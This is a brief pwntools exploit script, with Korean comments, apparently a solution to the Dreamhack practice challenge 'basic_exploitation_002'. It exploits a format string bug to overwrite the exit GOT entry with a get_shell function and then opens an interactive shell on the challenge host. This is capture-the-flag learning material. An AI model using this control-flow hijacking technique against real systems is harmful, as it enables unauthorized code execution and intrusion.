from pwn import *

x = process('./basic_exploitation_002')
x = remote('host1.dreamhack.games', 17022)
e = ELF('./basic_exploitation_002')

# fmtstr_payload는 포맷스트링 버그가 있을 때 알아서 payload 코드를 짜주는 함수
# 1. 프로그램실행하고 AAAA 입력하고 %x %x를 줘서 위치가 1번 인자이다.
payload = fmtstr_payload(1, {e.got['exit'] : e.symbols['get_shell']})
x.send(payload)

x.interactive()
